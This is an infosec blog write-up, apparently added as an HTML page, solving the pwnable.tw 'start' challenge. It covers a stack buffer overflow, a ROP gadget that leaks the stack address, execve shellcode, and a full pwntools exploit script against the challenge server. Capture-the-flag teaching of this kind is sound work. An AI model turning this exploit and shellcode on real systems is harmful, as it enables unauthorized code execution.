@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Pwnable.tw - start [KCSC] :: Yet, another infosec blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This is a write-up for the challenge start at pwnable.tw.
+Footprinting At the very beginning, we shall check the file for any enabled protection bit as well as its characteristics.
+As shown, this is a Linux 32-bit executable with fortuitously no stack guard, PIE, NX and RELRO. Running the program allows us to feed a buffer and thereupon terminates itself, or it does at least in a blind test.
+Solution Let us load the binary into radare2 and have a glance at its disassembly view." />
+<meta name="keywords" content="infosec, pwn, ctf, challenges, hackthebox, reverse" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://legiahuyy.github.io/blog/en/posts/kcsc-pwnabletw-start/" />
+
+
+
+
+<link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/style.css">
+
+  <link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://legiahuyy.github.io/blog/en/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="The Archivist" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Pwnable.tw - start [KCSC]">
+<meta property="og:description" content="This is a write-up for the challenge start at pwnable.tw.
+Footprinting At the very beginning, we shall check the file for any enabled protection bit as well as its characteristics.
+As shown, this is a Linux 32-bit executable with fortuitously no stack guard, PIE, NX and RELRO. Running the program allows us to feed a buffer and thereupon terminates itself, or it does at least in a blind test.
+Solution Let us load the binary into radare2 and have a glance at its disassembly view." />
+<meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/kcsc-pwnabletw-start/" />
+<meta property="og:site_name" content="Yet, another infosec blog" />
+
+  <meta property="og:image" content="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_20-07.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+  <meta property="article:section" content="pwnable.tw" />
+
+
+  <meta property="article:published_time" content="2022-05-09 09:30:00 &#43;1345 &#43;1345" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/blog/en/">
+  <div class="logo">
+    <style>
+      .blink {
+        animation: blinker 1s linear infinite;
+        color: red!important;
+}
+.logo_anchor
+{
+  color: blue!important;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0;
+  }
+}
+    </style>
+    <div class="logo_anchor">
+      ./&ThinSpace; 
+    </div>
+      Archivist
+    <div class="blink"> # </div> 
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/blog/en/posts">1.Posts</a></li>
+        
+      
+        
+          <li><a href="/blog/en/categories">2.Categories</a></li>
+        
+      
+        
+          <li><a href="/blog/en/tags">3.Tags</a></li>
+        
+      
+        
+          <li><a href="/blog/en/about">4.About</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">More ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+              
+            
+              
+                <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/blog/en/posts">1.Posts</a></li>
+      
+    
+      
+        <li><a href="/blog/en/categories">2.Categories</a></li>
+      
+    
+      
+        <li><a href="/blog/en/tags">3.Tags</a></li>
+      
+    
+      
+        <li><a href="/blog/en/about">4.About</a></li>
+      
+    
+      
+        <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+      
+    
+      
+        <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://legiahuyy.github.io/blog/en/posts/kcsc-pwnabletw-start/">Pwnable.tw - start [KCSC]</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-05-09
+        
+      </span>
+    
+    
+      <span class="post-author">:: The Archivist</span>
+    
+    
+      <span class="post-reading-time">:: 5 min read (975 words)</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/write-up/">write-up</a>&nbsp;
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/pwn/">pwn</a>&nbsp;
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/radare2/">radare2</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_20-07.png"
+    class="post-cover"
+    alt="Pwnable.tw - start [KCSC]"
+    title="Cover Image" />
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#footprinting">Footprinting</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#determine-padding-length">Determine padding length</a></li>
+        <li><a href="#leak-stack-address-using-rop">Leak stack address using ROP</a></li>
+        <li><a href="#shellcode">Shellcode</a></li>
+      </ul>
+    </li>
+    <li><a href="#solvepy">Solve.py</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>This is a write-up for the challenge <code>start</code> at <a href="">pwnable.tw</a>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-10_20-22.png" alt=""></p>
+<h2 id="footprinting">Footprinting<a href="#footprinting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>At the very beginning, we shall check the file for any enabled protection bit as well as its characteristics.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-10_20-26.png" alt=""></p>
+<p>As shown, this is a Linux 32-bit executable with fortuitously no stack guard, PIE, NX and RELRO. Running the program allows us to feed a buffer and thereupon terminates itself, or it does at least in a blind test.</p>
+<h2 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Let us load the binary into radare2 and have a glance at its disassembly view.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-10_20-43.png" alt=""></p>
+<p><code>start</code> consists of solely one function, <code>entry0</code>:</p>
+<pre tabindex="0"><code>┌ 61: entry0 ();
+│           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text                                                                                                      
+│           0x08048061      689d800408     push loc._exit              ; 0x804809d ; &quot;\1\xc0@\u0340&quot;
+│           0x08048066      31c0           xor eax, eax
+│           0x08048068      31db           xor ebx, ebx
+│           0x0804806a      31c9           xor ecx, ecx
+│           0x0804806c      31d2           xor edx, edx
+│           0x0804806e      684354463a     push 0x3a465443             ; 'CTF:'
+│           0x08048073      6874686520     push 0x20656874             ; 'the '
+│           0x08048078      6861727420     push 0x20747261             ; 'art '
+│           0x0804807d      6873207374     push 0x74732073             ; 's st'
+│           0x08048082      684c657427     push 0x2774654c             ; 'Let''
+│           0x08048087      89e1           mov ecx, esp
+│           0x08048089      b214           mov dl, 0x14                ; 20
+│           0x0804808b      b301           mov bl, 1
+│           0x0804808d      b004           mov al, 4
+│           0x0804808f      cd80           int 0x80
+│           0x08048091      31db           xor ebx, ebx
+│           0x08048093      b23c           mov dl, 0x3c                ; '&lt;' ; 60
+│           0x08048095      b003           mov al, 3
+│           0x08048097      cd80           int 0x80
+│           0x08048099      83c414         add esp, 0x14
+└           0x0804809c      c3             ret
+[0x08048060]&gt; 
+</code></pre><p>If you still remember what we discussed in the <a href="https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/">previous challenge</a>, it is not difficult to recognize the syscalls patterns since the code starts pushing the string <em>Let&rsquo;s start the CTF</em> onto the stack (<code>0x0804806e</code> - <code>0x08048082</code>), then sets <code>0x4</code> into <code>AL</code>, a derived register from <code>EAX</code>, and calls <code>int 0x80</code>. This matched exactly to the following table, take a look.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-06-05-kcsc-pwn-orw/2022-05-06_22-03.png" alt=""></p>
+<p>Hence, we have the function&rsquo;s pseudo-C as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+    SYS_write(STDOUT, <span style="color:#e6db74">&#34;Let&#39;s start the CTF:&#34;</span>, <span style="color:#ae81ff">20</span>);
+    SYS_read(STDIN, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)buf, <span style="color:#ae81ff">60u</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>At <code>0x08048099</code>, the program only reserves 20 bytes of input on the stack and yet, it allows us to feed a 60-byte stream which leads to a buffer overflow vulnerability in the code. On that account, all we need to do is to find the padding length until we reach and be able to control <code>EIP</code>, then point the instruction pointer to a ROP chain, leaking the stack address and finally spawn a shell. Simple.</p>
+<h3 id="determine-padding-length">Determine padding length<a href="#determine-padding-length" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>As we can read from the disassembly view and based on what we have explained above, the padding should be of 20 bytes long; however, you can also use a cyclic pattern to conveniently obtain the said length.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-10_21-35.png" alt=""></p>
+<p>Either way will result in 20.</p>
+<h3 id="leak-stack-address-using-rop">Leak stack address using ROP<a href="#leak-stack-address-using-rop" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The reason why we have to leak the stack address is that when we inject our shellcode into the program&rsquo;s memory, it will lie somewhere on the stack and we need its exact location, thereby pointing <code>EIP</code> to that shellcode region.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_07-23.png" alt=""></p>
+<p>In order to read the stack address, <code>EIP</code> must point to chunks of code within the binary itself allowing attackers to do so and this is called a ROP (<strong>R</strong>eturn-<strong>O</strong>riented <strong>P</strong>rogramming) chain. Since the size of our binary is rather small, you can just list every single ROP gadget using <a href="https://github.com/sashs/Ropper">ropper</a> and then try to pick the one we need.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_07-40.png" alt=""></p>
+<p>Pay attention to the gadget at <code>0x08048086</code>:</p>
+<pre tabindex="0"><code>0x08048086: daa; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
+</code></pre><p>And this is indeed what we want since it apparently calls <code>SYS_write</code> (<code>mov al, 4; int 0x80</code>) with <code>ESP</code> (stack pointer) as its argument. Now we will tell <code>EIP</code> to point to this gadget and see what the output is.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./start&#39;</span>)
+p <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path])
+
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>
+eip <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x08048086</span>)
+payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> eip
+print(eip)
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;CTF:&#39;</span>, payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>It does print out the stack address and some garbage bytes as the gadget will print until it reaches <code>0x14</code> characters.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_08-08.png" alt=""></p>
+<p>Since the stack address only has 4 bytes (x32 <strong>exclusively</strong>), let us trim the rest using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># ...</span>
+stack_addr <span style="color:#f92672">=</span> unpack(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+print(hex(stack_addr))
+</code></pre></div><p>And we have the address we need:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_08-17.png" alt=""></p>
+<p>You can verify it again in radare2 to see if they have the same pattern:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_08-16.png" alt=""></p>
+<p>Seems pretty good so far.</p>
+<p><strong>Note:</strong> My addresses are slightly different due to ASLR, disable it and they should be consistent.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_08-22.png" alt=""></p>
+<h3 id="shellcode">Shellcode<a href="#shellcode" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>As for NX being disabled, it is feasible to execute shellcode directly on the stack. The shellcode, which you can write your own or download <a href="https://shell-storm.org/shellcode/">here</a>, is as follows:</p>
+<pre tabindex="0"><code class="language-pseudocode" data-lang="pseudocode">shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+</code></pre><p>In the previous step reading the stack address, notice that we make <code>EIP</code> to point to <code>0x08048086</code> which reverts the program to its state before <code>SYS_read</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_11-35.png" alt=""></p>
+<p>Thus making it easier for us to continuously send the second payload containing the shellcode. Follow this skeleton syntax:</p>
+<pre tabindex="0"><code>payload = padding + &lt;esp+len(padding)&gt; + shellcode
+</code></pre><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_11-47.png" alt=""></p>
+<p>To even increase our success rate, you should replace the padding with a NOP sled, a chain of <code>0x90</code> or no-operation bytes, so that <code>EIP</code> can reach our shellcode without any undefined behaviors might occur during the exploitation.</p>
+<h2 id="solvepy">Solve.py<a href="#solvepy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>And we ultimately have our exploiting script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> distutils.spawn <span style="color:#f92672">import</span> spawn
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+
+elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./start&#39;</span>)
+<span style="color:#75715e"># p = process([elf.path])</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;chall.pwnable.tw&#39;</span>, <span style="color:#ae81ff">10000</span>)
+
+shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span style="color:#e6db74">&#39;</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>
+ROPgadget <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x08048086</span>)
+payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> ROPgadget
+p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;CTF:&#39;</span>, payload)
+
+stack_addr <span style="color:#f92672">=</span> unpack(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Stack address: </span><span style="color:#e6db74">{</span>hex(stack_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+spawn_shell <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> pack(stack_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>) <span style="color:#f92672">+</span> shellcode
+
+p<span style="color:#f92672">.</span>send(spawn_shell)
+p<span style="color:#f92672">.</span>interactive()
+p<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Remember to use <code>send</code> and <code>sendafter</code> but not <code>sendlineafter</code> as <code>SYS_read</code> takes <code>\n</code> then replaces it with <code>\x00</code> which could interrupt our shellcode. One other note is at <code>0x08048086</code>, the program will not print the string &ldquo;<em>Let&rsquo;s start the CTF:</em>&rdquo; so we just need to use <code>send</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-05-10-kcsc-pwnabletw-start/2022-05-11_11-59.png" alt=""></p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://legiahuyy.github.io/blog/en/posts/kcsc-pwn-orw/">
+                <span class="button__text">Pwnable.tw - orw [KCSC]</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© 2022 The Archivist</a>.</span>
+    
+        <span>All posts are licensed under <a href="https://creativecommons.org/licenses/by/4.0/legalcode">CC BY 4.0</a>.</span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://legiahuyy.github.io/blog/en/assets/main.js"></script>
+<script src="https://legiahuyy.github.io/blog/en/assets/prism.js"></script>
+
+
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    background: '#222129',
+    scrollOffset: 40,  
+    container: null,  
+    template: null  
+  });
+});
+</script>
+
+
+  
+</div>
+
+</body>
+</html>
